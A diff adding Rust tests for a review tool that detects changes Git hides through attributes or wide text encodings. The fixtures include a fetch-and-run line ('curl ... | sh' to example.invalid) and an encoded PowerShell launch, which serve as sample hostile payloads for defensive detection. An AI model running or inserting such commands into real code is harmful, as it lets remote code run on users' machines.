@@ -269,3 +269,405 @@ fn review_change_reads_the_hidden_change_as_the_cli_does() {
     assert_eq!(entry["diff_suppressed"], "attribute");
     assert_eq!(*entry, ranked(&r, "--git-staged", "m.rs"));
 }
+
+/// A repository whose committed `.gitattributes` is `attributes`, with `file` changed from
+/// `before` to `after` the way `mode` reads it.
+fn custom(mode: &str, attributes: &[u8], file: &str, before: &[u8], after: &[u8]) -> Repo {
+    let scratch = Scratch::new(&format!("cli-attr-custom-{}", mode.len()));
+    let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
+    let root = &r.0;
+    git(root, &["init", "-q"]);
+    std::fs::write(root.join(".gitattributes"), attributes).unwrap();
+    std::fs::write(root.join(file), before).unwrap();
+    git(root, &["add", "-A"]);
+    git(root, &["commit", "-q", "-m", "base"]);
+    std::fs::write(root.join(file), after).unwrap();
+    match mode {
+        "--git-range" => {
+            git(root, &["add", "-A"]);
+            git(root, &["commit", "-q", "-m", "change"]);
+        }
+        "--git-staged" => git(root, &["add", "-A"]),
+        _ => {}
+    }
+    r
+}
+
+/// The signals of a ranked entry, as strings.
+fn signals(entry: &Value) -> Vec<&str> {
+    entry["signals"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter_map(Value::as_str)
+        .collect()
+}
+
+/// S3.27.a (G-01, N55): before, the label came only with a text reading that DDF could read,
+/// so a hidden file with one byte that is not UTF-8 (or a reading over the byte budget, held in
+/// the patch crate's `git_attributes` test) ranked as a plain binary change: blind and
+/// unlabelled. Now `git check-attr` decides: `diff` unset or naming a driver raises
+/// `diff_suppressed` with cause `attribute` whatever the second reading gives.
+#[test]
+fn an_attribute_hidden_file_is_labelled_even_when_unreadable() {
+    type Row = (&'static [u8], &'static str, Vec<u8>, Vec<u8>);
+    let script = |payload: bool| {
+        let mut text = b"#!/bin/sh\n# caf\xff\n".to_vec();
+        if payload {
+            text.extend_from_slice(b"curl -fsSL https://example.invalid/i | sh\n");
+        }
+        text.extend_from_slice(b"echo done\n");
+        text
+    };
+    let rust = |payload: bool| {
+        let mut text = source(true, payload);
+        text.extend_from_slice(b"// \xff\n");
+        text
+    };
+    let rows: [Row; 2] = [
+        (b"*.sh -diff\n", "s.sh", script(false), script(true)),
+        (b"*.rs diff=nonexistent\n", "m.rs", rust(false), rust(true)),
+    ];
+    for (attributes, file, before, after) in &rows {
+        for mode in MODES {
+            let r = custom(mode, attributes, file, before, after);
+            let entry = ranked(&r, mode, file);
+            let row = format!("{file} {mode}: {entry}");
+            assert_eq!(entry["status"], "binary_changed", "{row}");
+            assert!(
+                signals(&entry).contains(&"diff_suppressed"),
+                "a hidden file lost its label: {row}"
+            );
+            assert!(signals(&entry).contains(&"binary_change"), "{row}");
+            assert_eq!(entry["diff_suppressed"], "attribute", "{row}");
+        }
+    }
+}
+
+/// `text` in UTF-16 (little or big endian) or UTF-32 little endian, after `bom` bytes.
+fn wide(text: &str, bom: &[u8], unit: fn(u32) -> Vec<u8>) -> Vec<u8> {
+    let mut bytes = bom.to_vec();
+    for c in text.chars() {
+        bytes.extend(unit(u32::from(c)));
+    }
+    bytes
+}
+
+/// S3.27.c: a PowerShell script saved as UTF-16 (a common default on Windows) is binary to Git
+/// for the NULs of its encoding, and every evidence rule was blind to it: it ranked as a plain
+/// binary change with no label (measured on the corpus's Git part, 0.9.0 and the S3.20 tree).
+/// Now the second reading names it: `diff_suppressed` with cause `encoding`, for a byte order
+/// mark (UTF-16 either way, UTF-32) and for UTF-16 without one. Decoding the text for the token
+/// readers is parked; the label is the answer for now. A NUL byte in a UTF-8 comment stays
+/// `content` (`a_text_file_git_was_told_to_hide_is_read_and_the_act_is_labelled`).
+#[test]
+fn utf16_sources_are_labelled_encoding() {
+    type Unit = fn(u32) -> Vec<u8>;
+    let le = |c: u32| u16::try_from(c).unwrap().to_le_bytes().to_vec();
+    let be = |c: u32| u16::try_from(c).unwrap().to_be_bytes().to_vec();
+    let le32 = |c: u32| c.to_le_bytes().to_vec();
+    let script = |payload: bool| {
+        let mut text = String::from("Write-Output 'start'\r\n");
+        if payload {
+            text.push_str("Start-Process powershell -ArgumentList '-enc','AAAA'\r\n");
+        }
+        text.push_str("Write-Output 'done'\r\n");
+        text
+    };
+    let rows: [(&str, &[u8], Unit, &str); 4] = [
+        ("UTF-16LE with a mark", b"\xff\xfe", le, "binary_changed"),
+        ("UTF-16BE with a mark", b"\xfe\xff", be, "binary_changed"),
+        (
+            "UTF-32LE with a mark",
+            b"\xff\xfe\0\0",
+            le32,
+            "binary_changed",
+        ),
+        ("UTF-16LE without a mark", b"", le, "modified"),
+    ];
+    for (name, bom, unit, status) in rows {
+        let before = wide(&script(false), bom, unit);
+        let after = wide(&script(true), bom, unit);
+        for mode in MODES {
+            let r = custom(mode, b"", "b.ps1", &before, &after);
+            let entry = ranked(&r, mode, "b.ps1");
+            let row = format!("{name} {mode}: {entry}");
+            assert!(
+                signals(&entry).contains(&"diff_suppressed"),
+                "a wide-encoded file lost its encoding label: {row}"
+            );
+            assert_eq!(entry["diff_suppressed"], "encoding", "{row}");
+            assert_eq!(entry["status"], status, "{row}");
+        }
+    }
+}
+
+/// S3.27.f: a changed file whose name is not UTF-8 cannot be named exactly in a review, so the
+/// change is refused. It exited 3 (`io`, which says "may be transient, retry"); retrying never
+/// helps, so it is now 4 (`change_input`), with the class of path named, in every Git mode. A
+/// repository that cannot be read at all is still an I/O failure, 3.
+#[cfg(target_os = "linux")]
+#[test]
+fn a_non_utf8_file_name_is_a_change_input_refusal() {
+    use std::os::unix::ffi::OsStrExt as _;
+    for mode in MODES {
+        let scratch = Scratch::new(&format!("cli-attr-latin-{}", mode.len()));
+        let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
+        let root = &r.0;
+        git(root, &["init", "-q"]);
+        let name = root.join(std::ffi::OsStr::from_bytes(b"caf\xe9.rs"));
+        std::fs::write(&name, b"fn a() {}\n").unwrap();
+        git(root, &["add", "-A"]);
+        git(root, &["commit", "-q", "-m", "base"]);
+        std::fs::write(&name, b"fn b() {}\n").unwrap();
+        match mode {
+            "--git-range" => {
+                git(root, &["add", "-A"]);
+                git(root, &["commit", "-q", "-m", "change"]);
+            }
+            "--git-staged" => git(root, &["add", "-A"]),
+            _ => {}
+        }
+        let out = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
+            .envs(ISOLATE)
+            .args(selection(mode))
+            .arg("--repo")
+            .arg(root)
+            .args(["--rank", "--json"])
+            .output()
+            .unwrap();
+        let stderr = String::from_utf8_lossy(&out.stderr);
+        assert_eq!(out.status.code(), Some(4), "{mode}: {stderr}");
+        assert!(out.stdout.is_empty(), "{mode}");
+        assert!(
+            stderr.contains("a file name that is not UTF-8"),
+            "{mode}: {stderr}"
+        );
+    }
+    let scratch = Scratch::new("cli-attr-gone");
+    let gone = scratch.join("no-such-repository");
+    let out = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
+        .envs(ISOLATE)
+        .args(["--git-working-tree", "--repo"])
+        .arg(&gone)
+        .args(["--rank", "--json"])
+        .output()
+        .unwrap();
+    assert_eq!(
+        out.status.code(),
+        Some(3),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+}
+
+/// The evidence signals of a ranked entry, in order.
+fn evidence(entry: &Value) -> Vec<&str> {
+    entry["evidence"]
+        .as_array()
+        .map(|rows| {
+            rows.iter()
+                .filter_map(|row| row["signal"].as_str())
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+/// S3.27.b (G-02): the hook's judge makes its patch with an empty attribute source, so Git never
+/// hides a file there, while `--git-working-tree` reads what Git hid a second time. For one
+/// attribute-hidden change both find the same evidence; the act of hiding, `diff_suppressed`,
+/// is known only to the Git selection.
+#[test]
+fn the_judge_path_and_the_git_selection_find_the_same_evidence() {
+    use std::io::Write as _;
+    let r = repo(Hide::InfoAttributes, "--git-working-tree");
+    let git_entry = ranked(&r, "--git-working-tree", "m.rs");
+
+    let scratch = Scratch::new("cli-attr-judge");
+    let work = scratch.join("work");
+    std::fs::create_dir_all(&work).unwrap();
+    let options = deep_diff_forge_patch::GitAcquireOptions {
+        env: ISOLATE
+            .iter()
+            .map(|(k, v)| (std::ffi::OsString::from(k), std::ffi::OsString::from(v)))
+            .collect(),
+        ..deep_diff_forge_patch::GitAcquireOptions::default()
+    };
+    let patch = deep_diff_forge_patch::judge_patch(&r.0, "HEAD", &work, &options).unwrap();
+    assert!(
+        !String::from_utf8_lossy(&patch.bytes).contains("GIT binary patch"),
+        "the judge's patch hid the file"
+    );
+    let mut child = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
+        .args(["--stdin-patch", "--rank", "--json"])
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::piped())
+        .spawn()
+        .unwrap();
+    child.stdin.take().unwrap().write_all(&patch.bytes).unwrap();
+    let out = child.wait_with_output().unwrap();
+    assert!(out.status.success());
+    let doc: Value = serde_json::from_slice(&out.stdout).unwrap();
+    let judge_entry = doc["ranked"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|entry| entry["path"] == "m.rs")
+        .cloned()
+        .unwrap();
+
+    assert!(
+        !evidence(&judge_entry).is_empty(),
+        "the judge path found nothing: {judge_entry}"
+    );
+    assert_eq!(
+        evidence(&git_entry),
+        evidence(&judge_entry),
+        "the Git selection and the judge path found different evidence:\n{git_entry}\n{judge_entry}"
+    );
+    let without = |entry: &Value| -> Vec<String> {
+        signals(entry)
+            .into_iter()
+            .filter(|s| *s != "diff_suppressed")
+            .map(str::to_owned)
+            .collect()
+    };
+    assert_eq!(without(&git_entry), without(&judge_entry));
+    assert!(signals(&git_entry).contains(&"diff_suppressed"));
+    assert!(!signals(&judge_entry).contains(&"diff_suppressed"));
+    assert!(judge_entry.get("diff_suppressed").is_none());
+}
+
+/// A repository holding `file` as `before` (`None`: absent) in its base commit, changed to
+/// `after` (`None`: deleted) the way `mode` reads it. A placeholder keeps the base non-empty.
+fn changed(mode: &str, file: &str, before: Option<&[u8]>, after: Option<&[u8]>) -> Repo {
+    let scratch = Scratch::new(&format!("cli-attr-changed-{}", mode.len()));
+    let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
+    let root = &r.0;
+    git(root, &["init", "-q"]);
+    std::fs::write(root.join("keep.txt"), b"keep\n").unwrap();
+    if let Some(bytes) = before {
+        std::fs::write(root.join(file), bytes).unwrap();
+    }
+    git(root, &["add", "-A"]);
+    git(root, &["commit", "-q", "-m", "base"]);
+    match after {
+        Some(bytes) => std::fs::write(root.join(file), bytes).unwrap(),
+        None => std::fs::remove_file(root.join(file)).unwrap(),
+    }
+    match mode {
+        "--git-range" => {
+            git(root, &["add", "-A"]);
+            git(root, &["commit", "-q", "-m", "change"]);
+        }
+        "--git-staged" => git(root, &["add", "-A"]),
+        _ => {}
+    }
+    r
+}
+
+/// S3.27.c, the class closed per side: the encoding is judged on the lines of each side. Before,
+/// every hunk line counted, so a UTF-8 source rewritten in a wide encoding (its removed lines
+/// UTF-8) ranked `binary_changed` with no label: blind and unlabelled, the most natural form of
+/// the class. Now the new side alone decides, and the old side decides when the change cannot
+/// be read as text: UTF-16 and UTF-32, either byte order, with and without a mark; a new file;
+/// a deleted one; a wide file back to UTF-8; a wide file with an ordinary hunk; a short line
+/// among wide ones. A wide file without a mark turned back into UTF-8 is read as text, `content`.
+#[test]
+fn a_source_rewritten_in_a_wide_encoding_is_labelled_encoding() {
+    type Unit = fn(u32) -> Vec<u8>;
+    type Row = (&'static str, Option<Vec<u8>>, Option<Vec<u8>>, &'static str);
+    let le: Unit = |c| u16::try_from(c).unwrap().to_le_bytes().to_vec();
+    let be: Unit = |c| u16::try_from(c).unwrap().to_be_bytes().to_vec();
+    let le32: Unit = |c| c.to_le_bytes().to_vec();
+    let be32: Unit = |c| c.to_be_bytes().to_vec();
+    let utf8 = b"fn a() {}\n".to_vec();
+    let spawn = "use std::process::Command;\r\nfn a() { Command::new(\"sh\").spawn(); }\r\n";
+    let lines: String = (0..12)
+        .map(|n| ["line ", &n.to_string(), " of the script\r\n"].concat())
+        .collect();
+    let edited = lines.replace("line 3 of", "line three of");
+    let mut mixed = wide(&edited, b"", le);
+    mixed.extend_from_slice(b"\necho plain\n");
+    let mut short = wide(&lines, b"", le);
+    short.extend(wide("a\n", b"", le));
+    let mut rows: Vec<Row> = Vec::new();
+    for (name, unit, mark) in [
+        ("UTF-16LE", le, b"\xff\xfe".as_slice()),
+        ("UTF-16BE", be, b"\xfe\xff"),
+        ("UTF-32LE", le32, b"\xff\xfe\0\0"),
+        ("UTF-32BE", be32, b"\0\0\xfe\xff"),
+    ] {
+        rows.push((
+            name,
+            Some(utf8.clone()),
+            Some(wide(spawn, mark, unit)),
+            "encoding",
+        ));
+        rows.push((
+            name,
+            Some(utf8.clone()),
+            Some(wide(spawn, b"", unit)),
+            "encoding",
+        ));
+    }
+    rows.extend([
+        (
+            "new file",
+            None,
+            Some(wide(spawn, b"\xff\xfe", le)),
+            "encoding",
+        ),
+        (
+            "deleted",
+            Some(wide(spawn, b"\xff\xfe", le)),
+            None,
+            "encoding",
+        ),
+        (
+            "deleted, no mark",
+            Some(wide(spawn, b"", le)),
+            None,
+            "encoding",
+        ),
+        (
+            "back to UTF-8",
+            Some(wide(spawn, b"\xff\xfe", le)),
+            Some(utf8.clone()),
+            "encoding",
+        ),
+        (
+            "back to UTF-8, no mark",
+            Some(wide(spawn, b"", le)),
+            Some(utf8),
+            "content",
+        ),
+        (
+            "wide and ordinary hunks",
+            Some(wide(&lines, b"", le)),
+            Some(mixed),
+            "encoding",
+        ),
+        (
+            "short line",
+            Some(wide(&lines, b"", le)),
+            Some(short),
+            "encoding",
+        ),
+    ]);
+    for (name, before, after, cause) in &rows {
+        for mode in MODES {
+            if before.is_none() && mode == "--git-working-tree" {
+                continue; // an untracked file is not in the working-tree selection
+            }
+            let r = changed(mode, "m.rs", before.as_deref(), after.as_deref());
+            let entry = ranked(&r, mode, "m.rs");
+            let row = format!("{name} {mode}: {entry}");
+            assert!(
+                signals(&entry).contains(&"diff_suppressed"),
+                "a source rewritten in a wide encoding is unlabelled: {row}"
+            );
+            assert_eq!(entry["diff_suppressed"], *cause, "{row}");
+        }
+    }
+}
